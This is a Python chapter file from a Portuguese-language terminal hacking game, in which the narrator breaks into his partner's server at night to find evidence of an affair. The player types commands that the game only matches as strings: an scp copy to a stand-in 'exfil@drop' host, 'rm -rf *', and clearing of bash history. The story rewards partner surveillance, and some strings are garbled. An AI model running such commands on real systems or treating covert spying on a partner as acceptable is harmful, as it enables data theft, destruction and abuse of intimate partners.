#!/usr/bin/env python3
"""
CHAPTER_01.PY - "O Protocolo da Traição"
Brasília, 02:47 AM. O quarto escuro, apenas o brilho azulado do laptop.
Juliana dorme ao seu lado, alheia. Há semanas de suspeitas. Hoje, a verdade.

Foco: Hacking emocional, invasão de servidor pessoal
Habilidades: SSH básico, navegação Linux, manipulação de arquivos
Objetivos: 5 missões principais com pressão de tempo
"""

import os
import sys
import time
import random
import json
import shutil
from datetime import datetime
from pathlib import Path

# Importar dependências
try:
    from utils.terminal_kali import C, digitar as _digitar_padrao
except ImportError:
    class C:
        VERDE = '\033[92m'
        VERMELHO = '\033[91m'
        BRANCO = '\033[97m'
        CINZA = '\033[90m'
        CIANO = '\033[96m'
        AMARELO = '\033[93m'
        ROXO = '\033[95m'
        NEGRITO = '\033[1m'
        RESET = '\033[0m'

    def _digitar_padrao(texto, delay=0.01, cor=C.BRANCO, fim="\n"):
        """Fallback para função de digitação"""
        for char in texto:
            print(f"{cor}{char}{C.RESET}", end='', flush=True)
            time.sleep(delay)
        print(fim, end='')


# ========== GERENCIADOR DE ESTADO DO JOGO ==========

class GameState:
    """Gerencia o estado durante o capítulo"""

    def __init__(self, dados_jogador):
        # Dados originais do jogador
        self.player_name = dados_jogador.get('player_name', 'Hacker')
        self.codiname = dados_jogador.get('codiname', 'ANON')
        self.current_chapter = dados_jogador.get('current_chapter', 1)
        self.completed_chapters = dados_jogador.get('completed_chapters', [])
        self.score = dados_jogador.get('score', 0)
        self.privacy_level = dados_jogador.get('privacy_level', 80)
        self.bitcoin_wallet = dados_jogador.get('bitcoin_wallet', 0.005)
        self.inventory = dados_jogador.get('inventory', [])
        self.darknet_access = dados_jogador.get('darknet_access', False)
        self.reputation = dados_jogador.get('reputation', 0)
        self.last_seen = dados_jogador.get('last_seen', datetime.now().isoformat())

        # Estado do capítulo
        self.capitulo_concluido = dados_jogador.get('completed', False)
        self.operacao_sucesso = dados_jogador.get('capitulo_1_operacao_sucesso', False)
        self.checkpoint = dados_jogador.get('chapter_01_checkpoint', 'inicio')
        self.saindo_para_menu = dados_jogador.get('saindo_para_menu', False)
        self.capitulo_1_resultado = dados_jogador.get('capitulo_1_resultado', None)

        # Missões do capítulo 1
        self.missoes = dados_jogador.get('missoes_capitulo_1', {
            'conexao_ssh': False,           # Conectar via SSH
            'navegacao_private': False,     # Navegar para pasta Private
            'listar_arquivos': False,       # Listar arquivos ocultos
            'exfiltrar_evidencias': False,  # Exfiltrar evidências
            'cobrir_rastros': False        # Limpar logs/servidor
        })

        # Missões do capítulo 1
        self.missoes = {
            'conexao_ssh': False,           # Conectar via SSH
            'navegacao_private': False,     # Navegar para pasta Private
            'listar_arquivos': False,       # Listar arquivos ocultos
            'exfiltrar_evidencias': False,  # Exfiltrar evidências
            'cobrir_rastros': False        # Limpar logs/servidor
        }

        # Contadores e flags
        self.tentativas_ssh = 0
        self.tempo_decorrido = 0
        self.risco_descoberta = 0

    def registrar_sucesso(self, pontos=10):
        """Registra sucesso e adiciona pontos"""
        self.score += pontos
        self.privacy_level = max(0, self.privacy_level - 2)  # Pequena perda de privacidade

    def registrar_falha(self, pontos_perdidos=5):
        """Registra falha e penaliza"""
        self.score = max(0, self.score - pontos_perdidos)
        self.privacy_level = max(0, self.privacy_level - 5)
        self.risco_descoberta += 10

    def completar_missao(self, missao_nome):
        """Marca missão como completa"""
        if missao_nome in self.missoes:
            self.missoes[missao_nome] = True
            self.registrar_sucesso(15)
            print(f"\n{C.VERDE}✓ MISSÃO CONCLUÍDA: {missao_nome.replace('_', ' ').upper()}{C.RESET}")

    def verificar_progresso(self):
        """Verifica progresso das missões"""
        completas = sum(self.missoes.values())
        total = len(self.missoes)
        return completas, total

    def to_dict(self):
        """Converte estado para dicionário (preserva dados originais)"""
        dados = {
            'player_name': self.player_name,
            'codiname': self.codiname,
            'current_chapter': self.current_chapter,
            'completed_chapters': self.completed_chapters,
            'score': self.score,
            'privacy_level': self.privacy_level,
            'bitcoin_wallet': self.bitcoin_wallet,
            'inventory': self.inventory,
            'darknet_access': self.darknet_access,
            'reputation': self.reputation,
            'last_seen': self.last_seen,
            'chapter_01_checkpoint': self.checkpoint,
            'capitulo_1_resultado': self.capitulo_1_resultado,
            'capitulo_1_operacao_sucesso': self.operacao_sucesso,
            'completed': self.capitulo_concluido,
            'saindo_para_menu': self.saindo_para_menu,
            'missoes_capitulo_1': self.missoes.copy()
        }
        return dados


# ========== FUNÇÕES AUXILIARES ==========

def limpar_tela():
    """Limpa a tela do terminal"""
    os.system('clear' if os.name != 'nt' else 'cls')

def digitar(texto, delay=0.03, cor=C.BRANCO):
    """Função de digitação com efeito"""
    _digitar_padrao(texto, delay, cor)

def erro(mensagem):
    """Exibe mensagem de erro"""
    print(f"\n{C.VERMELHO}[ERRO] {mensagem}{C.RESET}")

def sucesso(mensagem):
    """Exibe mensagem de sucesso"""
    print(f"\n{C.VERDE}[SUCESSO] {mensagem}{C.RESET}")

def aviso(mensagem):
    """Exibe mensagem de aviso"""
    print(f"\n{C.AMARELO}[AVISO] {mensagem}{C.RESET}")

def prompt_kali(username="hacker"):
    """Retorna prompt estilo Kali Linux"""
    return f"{C.VERDE}{username}{C.CINZA}@{C.AMARELO}kali{C.RESET}{C.CINZA}:{C.AMARELO}~{C.RESET}{C.CINZA}$ {C.RESET}"

def exibir_header():
    """Exibe cabeçalho do capítulo"""
    limpar_tela()
    print(f"\n{C.VERMELHO}{'═' * 80}{C.RESET}")
    print(f"{C.VERMELHO}║{'ROOT EVOLUTION - CAPÍTULO 1: PROTOCOLO TRAIÇÃO':^78}║{C.RESET}")
    print(f"{C.CINZA}║{'Brasília, 02:47 AM | Terminal: Kali Linux 2024':^78}║{C.RESET}")
    print(f"{C.VERMELHO}{'═' * 80}{C.RESET}")
    print(f"\n{C.CINZA}💡 DICA: Digite 'menu' para retornar ao menu do jogo a qualquer momento.{C.RESET}")
    print(f"{C.CINZA}📖 Acesse 'manual' para consultar o Manual de Hacking durante o jogo.{C.RESET}")
    print(f"{C.VERMELHO}{'═' * 80}{C.RESET}")

def exibir_status(state):
    """Exibe status atual do jogador"""
    completas, total = state.verificar_progresso()
    progresso = completas / total * 100

    print(f"\n{C.AMARELO}┌─ STATUS DO HACKER ──────────────────────────────┐{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} Score: {C.VERDE}{state.score:3d}{C.RESET} │ Privacidade: {C.CIANO}{state.privacy_level:2d}%{C.RESET} │ Missões: {C.VERDE}{completas}/{total}{C.RESET} ({C.VERDE}{progresso:3.0f}%{C.RESET}) {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}└─────────────────────────────────────────────────┘{C.RESET}")

def exibir_proximidade_juliana(estagio):
    """Exibe visualmente quão perto Juliana está"""
    estagios = [
        "[    ] Dormindo profundamente...",
        "[█   ] Movimento na cama...",
        "[██  ] Senta na cama...",
        "[███ ] Caminhando pelo corredor...",
        "[████] Colocando a mão na maçaneta...",
        "[████] A PORTA ESTÁ ABRINDO!"
    ]

    idx = min(estagio, len(estagios) - 1)
    cor = C.VERMELHO if estagio >= 4 else C.AMARELO if estagio >= 2 else C.CINZA

    print(f"\n{cor}⚠️  PROXIMIDADE DE JULIANA: {estagios[idx]}{C.RESET}")

def salvar_checkpoint(state, arquivo_save, checkpoint_nome):
    """Salva checkpoint do jogo"""
    state.checkpoint = checkpoint_nome
    dados = state.to_dict()

    try:
        with open(arquivo_save, 'w', encoding='utf-8') as f:
            json.dump(dados, f, indent=2, ensure_ascii=False)
        print(f"\n{C.CINZA}[✓] Checkpoint salvo: {checkpoint_nome}{C.RESET}")
    except Exception as e:
        erro(f"Erro ao salvar checkpoint: {e}")

def carregar_manual():
    """Carrega o manual de hacking"""
    try:
        from manual_hacking import ManualHacking
        manual = ManualHacking()
        manual.mostrar_menu()
        return True
    except ImportError:
        erro("Manual de hacking não encontrado")
        return False

# ========== FUNÇÕES DE JOGABILIDADE ==========

def prompt_com_tempo(cmd_esperado, descricao, state, limite_tempo=30):
    """
    Prompt com limite de tempo e pressão
    """
    print(f"\n{C.CINZA}🎯 OBJETIVO: {descricao}{C.RESET}")
    print(f"{C.VERDE}💻 COMANDO: {cmd_esperado}{C.RESET}")

    tempo_inicio = time.time()
    estagio_proximidade = 0

    while True:
        tempo_atual = time.time() - tempo_inicio

        # Aumenta proximidade a cada 5 segundos
        novo_estagio = int(tempo_atual / 5)
        if novo_estagio > estagio_proximidade:
            estagio_proximidade = novo_estagio
            exibir_proximidade_juliana(estagio_proximidade)

        if tempo_atual > limite_tempo:
            erro("TEMPO ESGOTADO! Juliana acordou!")
            state.registrar_falha(20)
            return False

        try:
            cmd = input(f"{C.AZUL}> {C.RESET}").strip()
        except KeyboardInterrupt:
            print(f"\n{C.VERMELHO}Execução interrompida.{C.RESET}")
            return False

        if cmd.lower() == 'menu':
            state.saindo_para_menu = True
            print(f"\n{C.AMARELO}Retornando ao menu principal...{C.RESET}")
            return False

        if cmd.lower() == 'manual':
            if carregar_manual():
                aviso("Você perdeu tempo consultando o manual!")
                state.registrar_falha(5)
                estagio_proximidade += 1
            continue

        if cmd == cmd_esperado:
            sucesso("Comando executado com sucesso!")
            return True
        else:
            erro("Comando incorreto. Tente novamente.")
            state.registrar_falha(3)
            estagio_proximidade += 1

def tutorial_basico():
    """Tutorial básico de comandos Linux"""
    print(f"\n{C.AMARELO}┌─ TUTORIAL BÁSICO DE LINUX ──────────────────────┐{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} Comandos essenciais que você aprenderá:        {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET}                                               {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}ssh user@host{C.RESET} - Conectar remotamente     {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}ls -la{C.RESET} - Listar arquivos detalhado     {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}cd pasta{C.RESET} - Entrar em diretório        {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}scp arquivo user@host:~/{C.RESET} - Copiar arquivo {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}│{C.RESET} • {C.VERDE}rm -rf arquivo{C.RESET} - Remover arquivo        {C.AMARELO}│{C.RESET}")
    print(f"{C.AMARELO}└─────────────────────────────────────────────────┘{C.RESET}")
    input(f"\n{C.CINZA}[ENTER para continuar]{C.RESET}")

# ========== CAPÍTULO 1: SEQUÊNCIA PRINCIPAL ==========

def iniciar(dados_jogador, arquivo_save=None):
    """
    Função principal do Capítulo 1
    """
    state = GameState(dados_jogador)

    try:
        # Introdução dramática
        exibir_header()

        digitar("O café esfriou há horas. O silêncio é quebrado apenas pelo cooler do PC...", delay=0.05, cor=C.CIANO)
        time.sleep(1.5)
        digitar("Juliana dorme ao meu lado. Ela tem andado muito distante ultimamente.", delay=0.05, cor=C.CIANO)
        digitar("Eu não deveria fazer isso, mas a minha desconfiança me leva a isso...", delay=0.05, cor=C.CIANO)

        print(f"\n{C.CINZA}{'─' * 73}{C.RESET}")
        time.sleep(1)

        # Tutorial básico
        tutorial_basico()

        # MISSÃO 1: Conexão SSH
        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
        print(f"{C.AMARELO}🎯 MISSÃO 1/5: CONEXÃO REMOTA{C.RESET}")
        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

        digitar("\n[*] Iniciando sequência de hacking...", delay=0.03, cor=C.VERDE)
        digitar("# DICA: Vou conectar ao servidor remoto usando SSH: ssh admin@backup-cloud", delay=0.03, cor=C.CINZA)

        if prompt_com_tempo("ssh admin@backup-cloud", "Conectar ao servidor backup-cloud via SSH", state, limite_tempo=45):
            state.completar_missao('conexao_ssh')
            sucesso("Sessão remota estabelecida com sucesso!")
            salvar_checkpoint(state, arquivo_save, 'ssh_conectado')
        else:
            return state.to_dict()

        exibir_status(state)
        time.sleep(2)

        # MISSÃO 2: Navegação para pasta Private
        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
        print(f"{C.AMARELO}🎯 MISSÃO 2/5: NAVEGAÇÃO NO SISTEMA{C.RESET}")
        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

        digitar("\n[*] Conectado ao servidor backup-cloud", delay=0.03, cor=C.VERDE)
        digitar("# Agora preciso navegar para a pasta 'Private' onde estão os arquivos suspeitos", delay=0.03, cor=C.CINZA)
        digitar("# Comando: cd Private", delay=0.03, cor=C.CINZA)

        if prompt_com_tempo("cd Private", "Navegar para a pasta Private", state, limite_tempo=30):
            state.completar_missao('navegacao_private')
            sucesso("Entrou na pasta Private!")
            salvar_checkpoint(state, arquivo_save, 'private_acessado')
        else:
            return state.to_dict()

        exibir_status(state)
        time.sleep(2)

        # MISSÃO 3: Listar arquivos ocultos
        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
        print(f"{C.AMARELO}🎯 MISSÃO 3/5: ANÁLISE DE ARQUIVOS{C.RESET}")
        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

        digitar("\n[*] Na pasta Private. Hora de ver o que está escondido aqui.", delay=0.03, cor=C.VERDE)
        digitar("# Vou listar todos os arquivos, incluindo os ocultos (que começam com .)", delay=0.03, cor=C.CINZA)
        digitar("# Comando: ls -la", delay=0.03, cor=C.CINZA)

        if prompt_com_tempo("ls -la", "Listar todos os arquivos incluindo ocultos", state, limite_tempo=25):
            state.completar_missao('listar_arquivos')
            print(f"\n{C.VERMELHO}.conversa_hotel_nobile.pdf{C.RESET} | {C.VERMELHO}.fotos_reserva_dupla.zip{C.RESET}")
            print(f"{C.VERMELHO}.comprovante_transferencia_50k.pdf{C.RESET} | {C.VERMELHO}.emails_comprometedores.txt{C.RESET}")
            sucesso("Arquivos suspeitos encontrados!")
            salvar_checkpoint(state, arquivo_save, 'arquivos_listados')
        else:
            return state.to_dict()

        exibir_status(state)
        time.sleep(3)

        # ALERTA: Juliana acorda!
        print(f"\n{C.VERMELHO}{C.NEGRITO}* O RANGER DA CAMA... JULIANA ACORDOU! *{C.RESET}")
        time.sleep(2)

        digitar("\nJuliana: '...Amor? Ainda acordado? O que você está fazendo?'", delay=0.05, cor=C.BRANCO)
        time.sleep(1.5)
        digitar("\nDROGA! Ela está vindo em direção à mesa! Rápido!", delay=0.03, cor=C.VERMELHO)

        print(f"\n{C.VERMELHO}{C.NEGRITO}--- DECISÃO SOB PRESSÃO ---{C.RESET}")
        print(f"{C.BRANCO}[1]{C.RESET} EXFILTRAR (Copiar evidências via SCP)")
        print(f"{C.BRANCO}[2]{C.RESET} DESTRUIR (Remover tudo via RM)")

        escolha = ""
        while escolha not in ["1", "2"]:
            try:
                escolha = input(f"\n{C.VERMELHO}[ESCOLHA 1 ou 2]: {C.RESET}").strip()
            except KeyboardInterrupt:
                return state.to_dict()

        # MISSÃO 4: Exfiltrar ou destruir evidências
        if escolha == "1":
            print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
            print(f"{C.AMARELO}🎯 MISSÃO 4/5: EXFILTRAÇÃO DE EVIDÊNCIAS{C.RESET}")
            print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

            digitar("\capitulo_1_resultados. Vou copiar os arquivos suspeitos.", delay=0.03, cor=C.CINZA)
            digitar("# Comando: scp .conversa_hotel_nobile.pdf exfil@drop:~/", delay=0.03, cor=C.CINZA)

            if prompt_com_tempo("scp .conversa_hotel_nobile.pdf exfil@drop:~/", "Exfiltrar arquivo de evidências", state, limite_tempo=20):
                state.completar_missao('exfiltrar_evidencias')
                sucesso("Evidências exfiltradas com sucesso!")
                state.capitulo_1_resultado = 'exfiltrar'
            else:
                return state.to_dict()

        else:  # escolha == "2"
            print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
            print(f"{C.AMARELO}🎯 MISSÃO 4/5: DESTRUIÇÃO DE EVIDÊNCIAS{C.RESET}")
            print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

            digitar("\capitulo_1_resultadoro viver com essas dúvidas.", delay=0.03, cor=C.CINZA)
            digitar("# Comando: rm -rf *", delay=0.03, cor=C.CINZA)

            if prompt_com_tempo("rm -rf *", "Remover todos os arquivos da pasta", state, limite_tempo=20):
                state.completar_missao('exfiltrar_evidencias')  # Mesmo objetivo, método diferente
                sucesso("Todos os arquivos removidos!")
                state.capitulo_1_resultado = 'destruir'
            else:
                return state.to_dict()

        # MISSÃO 5: Cobrir rastros
        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
        print(f"{C.AMARELO}🎯 MISSÃO 5/5: LIMPAR RASTROS{C.RESET}")
        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")

        digitar("\n# Agora preciso limpar meus rastros no servidor.", delay=0.03, cor=C.CINZA)
        digitar("# Vou limpar os logs de acesso e histórico.", delay=0.03, cor=C.CINZA)
        digitar("# Comando: history -c && rm -f ~/.bash_history", delay=0.03, cor=C.CINZA)

        if prompt_com_tempo("history -c && rm -f ~/.bash_history", "Limpar histórico e logs", state, limite_tempo=15):
            state.completar_missao('cobrir_rastros')
            sucesso("Rastros cobertos! Servidor limpo.")
        else:
            return state.to_dict()

        # FINAL DO CAPÍTULO
        exibir_status(state)

        # Verificar se Juliana ainda está vindo
        if state.risco_descoberta < 50:
            digitar("\nVocê fecha o notebook no exato segundo em que ela toca no seu ombro.", delay=0.05, cor=C.CIANO)
            digitar("Juliana: 'Vem dormir, amor... você trabalha demais.'", delay=0.05, cor=C.BRANCO)
            state.operacao_sucesso = True
        else:
            digitar("\nEla vê a tela do computador. Os arquivos ainda estão abertos.", delay=0.05, cor=C.VERMELHO)
            digitar("Juliana: 'Então é isso que você faz enquanto eu durmo?'", delay=0.05, cor=C.BRANCO)
            state.registrar_falha(30)

        state.capitulo_concluido = True
        salvar_checkpoint(state, arquivo_save, 'capitulo_concluido')

        # Resumo final
        completas, total = state.verificar_progresso()
        print(f"\n{C.VERDE}{'═' * 60}{C.RESET}")
        print(f"{C.VERDE}✓ CAPÍTULO 1 CONCLUÍDO!{C.RESET}")
        print(f"{C.CIANO}Decisão: {state.to_dict()['capitulo_1_resultado']}{C.RESET}")
        print(f"{C.CIANO}Missões completadas: {completas}/{total}{C.RESET}")
        print(f"{C.CIANO}Score final: {state.score}{C.RESET}")
        print(f"{C.VERDE}{'═' * 60}{C.RESET}")

        input(f"\n{C.CINZA}[ENTER para continuar para o próximo capítulo]{C.RESET}")

        return state.to_dict()

    except KeyboardInterrupt:
        print(f"\n{C.VERMELHO}Capítulo interrompido pelo usuário.{C.RESET}")
        return state.to_dict()
    except Exception as e:
        erro(f"Erro inesperado no capítulo: {e}")
        return state.to_dict()


